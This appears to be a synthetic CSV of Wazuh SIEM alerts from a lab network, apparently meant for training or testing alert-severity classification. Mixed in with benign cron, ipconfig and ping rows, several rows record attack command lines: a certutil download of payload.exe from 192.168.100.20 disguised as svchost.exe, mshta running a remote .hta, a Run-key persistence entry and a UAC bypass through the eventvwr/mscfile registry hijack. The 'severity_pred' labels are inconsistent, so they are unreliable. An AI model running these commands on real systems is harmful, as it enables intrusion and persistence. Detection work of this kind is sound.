@timestamp,agent.name,agent.id,rule.id,rule.description,rule.level,rule.mitre.id,location,data.win.eventdata.commandLine,raw,severity_pred
2025-12-28T11:26:11.245Z,Endpoint3-Win,1,92041,Registry key modified suspiciously,10,T1112,EventChannel,"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d \""C:\Users\ayoub\AppData\Local\Temp\updater.exe\"" /f","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 11, ""mail"": false, ""level"": 10, ""description"": ""Registry key modified suspiciously"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1112""]}, ""id"": ""92041""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T11:26:11.245Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T11:26:11.245Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v updater /t REG_SZ /d \\\""C:\\Users\\ayoub\\AppData\\Local\\Temp\\updater.exe\\\"" /f"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""7693"", ""utcTime"": ""2025-12-28 11:26:11.245""}}}}",medium
2025-12-30T02:11:54.608Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 15, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T02:11:54.608Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T02:11:54.608Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T02:11:54.608+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-30T03:11:23.880Z,Endpoint1-Win,3,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 15, ""mail"": true, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T03:11:23.880Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T03:11:23.880Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""5334"", ""utcTime"": ""2025-12-30 03:11:23.880""}}}}",critical
2025-12-29T06:57:27.117Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 10, ""mail"": true, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T06:57:27.117Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T06:57:27.117Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""5352"", ""utcTime"": ""2025-12-29 06:57:27.117""}}}}",critical
2025-12-28T05:11:59.061Z,Endpoint2-Win,2,92052,Command prompt started by abnormal process,6,T1059.003,EventChannel,"\""cmd.exe\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\Users\ayoub\AppData\Local\Temp\svchost.exe","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 39, ""mail"": true, ""level"": 6, ""description"": ""Command prompt started by abnormal process"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""92052""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T05:11:59.061Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T05:11:59.061Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10325"", ""utcTime"": ""2025-12-28 05:11:59.061""}}}}",critical
2025-12-29T07:58:41.127Z,Endpoint1-Win,3,91530,User executed network diagnostics,2,,EventChannel,"\""C:\Windows\System32\ping.exe\"" 8.8.8.8 -n 2","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 45, ""mail"": false, ""level"": 2, ""description"": ""User executed network diagnostics"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91530""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T07:58:41.127Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T07:58:41.127Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ping.exe\\\"" 8.8.8.8 -n 2"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""5460"", ""utcTime"": ""2025-12-29 07:58:41.127""}}}}",low
2025-12-29T07:52:35.082Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 48, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T07:52:35.082Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T07:52:35.082Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T07:52:35.082+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-28T01:53:00.093Z,Endpoint1-Win,3,92057,Powershell executed base64 encoded command,12,T1059.001,EventChannel,"\""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"" -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQALgBlAHgAZQA=","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 37, ""mail"": false, ""level"": 12, ""description"": ""Powershell executed base64 encoded command"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""92057""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T01:53:00.093Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T01:53:00.093Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\"" -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQALgBlAHgAZQA="", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3870"", ""utcTime"": ""2025-12-28 01:53:00.093""}}}}",low
2025-12-29T13:47:23.667Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 12, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T13:47:23.667Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T13:47:23.667Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T13:47:23.667+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-29T22:13:25.833Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 31, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T22:13:25.833Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T22:13:25.833Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T22:13:25.833+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-29T00:16:14.328Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 22, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T00:16:14.328Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T00:16:14.328Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T00:16:14.328+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-28T20:59:14.678Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 30, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T20:59:14.678Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T20:59:14.678Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T20:59:14.678+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-28T18:22:44.331Z,Endpoint1-Win,3,92004,Powershell spawned cmd.exe for UAC bypass behavior,9,T1548.002,EventChannel,"\""cmd.exe\"" /c reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d \""C:\Windows\System32\cmd.exe\"" /f & cmd.exe /c eventvwr.msc","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 56, ""mail"": true, ""level"": 9, ""description"": ""Powershell spawned cmd.exe for UAC bypass behavior"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1548.002""]}, ""id"": ""92004""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T18:22:44.331Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T18:22:44.331Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \\\""C:\\Windows\\System32\\cmd.exe\\\"" /f & cmd.exe /c eventvwr.msc"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1018"", ""utcTime"": ""2025-12-28 18:22:44.331""}}}}",critical
2025-12-29T06:05:30.055Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 40, ""mail"": true, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T06:05:30.055Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T06:05:30.055Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T06:05:30.055+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",critical
2025-12-29T21:32:27.452Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 18, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T21:32:27.452Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T21:32:27.452Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T21:32:27.452+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-30T19:33:03.294Z,Endpoint2-Win,2,91533,Legitimate ipconfig execution,2,,EventChannel,"\""C:\Windows\System32\ipconfig.exe\"" /all","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 32, ""mail"": false, ""level"": 2, ""description"": ""Legitimate ipconfig execution"", ""groups"": [""windows""], ""mitre"": {}, ""id"": ""91533""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T19:33:03.294Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T19:33:03.294Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\ipconfig.exe\\\"" /all"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""1472"", ""utcTime"": ""2025-12-30 19:33:03.294""}}}}",low
2025-12-30T03:41:05.162Z,Endpoint2-Win,2,92057,Powershell executed base64 encoded command,12,T1059.001,EventChannel,"\""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\"" -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAEMAOgBcAFUAcwBlAHIAcwBcAGEAeQBvAHUAYgBcAEQAZQBzAGsAdABvAHAA","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 6, ""mail"": false, ""level"": 12, ""description"": ""Powershell executed base64 encoded command"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""92057""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T03:41:05.162Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T03:41:05.162Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\\"" -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAEMAOgBcAFUAcwBlAHIAcwBcAGEAeQBvAHUAYgBcAEQAZQBzAGsAdABvAHAA"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""2858"", ""utcTime"": ""2025-12-30 03:41:05.162""}}}}",medium
2025-12-30T20:57:46.120Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 32, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T20:57:46.120Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T20:57:46.120Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T20:57:46.120+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
2025-12-29T13:03:17.722Z,Endpoint1-Win,3,92090,Suspicious LOLBin mshta used to execute remote script,12,T1218.005,EventChannel,"\""C:\Windows\System32\mshta.exe\"" http://192.168.100.20/a.hta","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 31, ""mail"": false, ""level"": 12, ""description"": ""Suspicious LOLBin mshta used to execute remote script"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1218.005""]}, ""id"": ""92090""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T13:03:17.722Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T13:03:17.722Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""C:\\Windows\\System32\\mshta.exe\\\"" http://192.168.100.20/a.hta"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""8483"", ""utcTime"": ""2025-12-29 13:03:17.722""}}}}",low
2025-12-29T03:55:54.195Z,Endpoint2-Win,2,91532,Legitimate tasklist execution,2,T1059.003,EventChannel,"\""cmd.exe\"" /c tasklist /fi \""IMAGENAME eq svchost.exe\""","{""agent"": {""ip"": ""192.168.100.12"", ""name"": ""Endpoint2-Win"", ""id"": ""002""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 48, ""mail"": true, ""level"": 2, ""description"": ""Legitimate tasklist execution"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""91532""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T03:55:54.195Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-29T03:55:54.195Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c tasklist /fi \\\""IMAGENAME eq svchost.exe\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""3236"", ""utcTime"": ""2025-12-29 03:55:54.195""}}}}",critical
2025-12-28T20:06:56.791Z,Endpoint3-Win,1,91531,Legitimate service query,2,T1059.001,EventChannel,"\""powershell.exe\"" -Command \""Get-Service | Select-Object -First 5\""","{""agent"": {""ip"": ""192.168.100.15"", ""name"": ""Endpoint3-Win"", ""id"": ""001""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 22, ""mail"": true, ""level"": 2, ""description"": ""Legitimate service query"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.001""]}, ""id"": ""91531""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T20:06:56.791Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-28T20:06:56.791Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""commandLine"": ""\\\""powershell.exe\\\"" -Command \\\""Get-Service | Select-Object -First 5\\\"""", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""9318"", ""utcTime"": ""2025-12-28 20:06:56.791""}}}}",critical
2025-12-30T11:45:02.002Z,Endpoint1-Win,3,92052,Command prompt started by abnormal process,6,T1059.003,EventChannel,"\""cmd.exe\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\Users\ayoub\AppData\Local\Temp\svchost.exe","{""agent"": {""ip"": ""192.168.100.11"", ""name"": ""Endpoint1-Win"", ""id"": ""003""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 54, ""mail"": true, ""level"": 6, ""description"": ""Command prompt started by abnormal process"", ""groups"": [""windows""], ""mitre"": {""id"": [""T1059.003""]}, ""id"": ""92052""}, ""decoder"": {""name"": ""windows_eventchannel""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T11:45:02.002Z"", ""location"": ""EventChannel"", ""timestamp"": ""2025-12-30T11:45:02.002Z"", ""data"": {""win"": {""eventdata"": {""image"": ""C:\\Windows\\System32\\cmd.exe"", ""commandLine"": ""\\\""cmd.exe\\\"" /c certutil -urlcache -split -f http://192.168.100.20/payload.exe C:\\Users\\ayoub\\AppData\\Local\\Temp\\svchost.exe"", ""user"": ""WINDOWSEND-C792\\ayoub"", ""processId"": ""10501"", ""utcTime"": ""2025-12-30 11:45:02.002""}}}}",critical
2025-12-30T15:00:22.152Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 23, ""mail"": false, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-30T15:00:22.152Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-30T15:00:22.152Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-30T15:00:22.152+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",low
2025-12-29T09:09:25.955Z,wazuh-vm,0,52002,Apparmor DENIED,3,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 45, ""mail"": false, ""level"": 3, ""description"": ""Apparmor DENIED"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""52002""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-29T09:09:25.955Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-29T09:09:25.955Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-29T09:09:25.955+01:00""}, ""full_log"": ""2025-12-28T23:17:27.131124+01:00 wazuh-vm kernel: audit: type=1400 audit(1766960247.129:424): apparmor=\""DENIED\"" operation=\""open\"" class=\""file\"" profile=\""snap.firefox.firefox\"" name=\""/proc/pressure/memory\"" pid=11504 comm=\""MemoryPoller\"" requested_mask=\""r\"" denied_mask=\""r\"" fsuid=1001 ouid=0""}",low
2025-12-28T17:00:26.876Z,wazuh-vm,0,51001,Cron executed scheduled job,2,,/var/log/syslog,,"{""agent"": {""ip"": ""192.168.100.10"", ""name"": ""wazuh-vm"", ""id"": ""000""}, ""manager"": {""name"": ""wazuh-vm""}, ""rule"": {""firedtimes"": 21, ""mail"": true, ""level"": 2, ""description"": ""Cron executed scheduled job"", ""groups"": [""syslog"", ""apparmor""], ""mitre"": {}, ""id"": ""51001""}, ""decoder"": {""name"": ""syslog""}, ""input"": {""type"": ""log""}, ""@timestamp"": ""2025-12-28T17:00:26.876Z"", ""location"": ""/var/log/syslog"", ""timestamp"": ""2025-12-28T17:00:26.876Z"", ""predecoder"": {""program_name"": ""kernel"", ""timestamp"": ""2025-12-28T17:00:26.876+01:00""}, ""full_log"": ""Dec 29 09:10:01 wazuh-vm CRON[2311]: (root) CMD (/usr/bin/apt-get update -y)""}",critical
